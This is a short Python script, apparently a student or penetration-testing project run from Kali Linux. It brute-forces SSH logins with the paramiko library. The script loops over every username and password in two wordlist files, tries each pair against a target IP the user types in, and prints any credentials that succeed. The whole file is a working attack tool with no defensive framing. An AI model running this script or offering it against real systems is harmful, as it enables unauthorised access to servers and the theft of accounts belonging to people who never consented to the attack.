import paramiko
import time

def attempt_login(target_ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"Trying username: {username}, password: {password}")
        ssh.connect(target_ip, port=22, username=username, password=password, timeout=5, banner_timeout=5)
        print(f"Success! The username is: {username}, and the password is: {password}")
        return username, password
    except paramiko.AuthenticationException:
        print(f"Failed with username: {username}, password: {password}")
    except paramiko.SSHException as ssh_exception:
        print(f"SSH Exception: {ssh_exception}")
        time.sleep(5)
    except Exception as e:
        print(f"Connection error: {e}")
        time.sleep(5)
    finally:
        ssh.close()
    return None

def ssh_bruteforce(target_ip, username_file, password_file):
    start_time = time.time()

    with open(username_file, 'r') as file:
        usernames = file.read().splitlines()
        
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    for username in usernames:
        for password in passwords:
            result = attempt_login(target_ip, username, password)
            if result:
                end_time = time.time()
                elapsed_time = end_time - start_time
                print(f"Credentials found: Username: {result[0]}, Password: {result[1]}")
                print(f"Total time taken: {elapsed_time:.2f} seconds")
                return result

    end_time = time.time()
    elapsed_time = end_time - start_time
    print("Brute force attack failed.")
    print(f"Total time taken: {elapsed_time:.2f} seconds")
    return None

if __name__ == "__main__":
    print("")
    print("█▀ █▀ █░█   █▄▄ █▀█ █░█ ▀█▀   █▀▀ █▀█ █▀█ █▀▀ █▀▀")
    print("▄█ ▄█ █▀█   █▄█ █▀▄ █▄█ ░█░   █▀░ █▄█ █▀▄ █▄▄ ██▄")
    print("")
    target_ip = input("Enter target IP: ")
    username_file = "/home/kali/Desktop/Projet/NEED/user.txt"
    password_file = "/home/kali/Desktop/Projet/NEED/password.txt"

    ssh_bruteforce(target_ip, username_file, password_file)
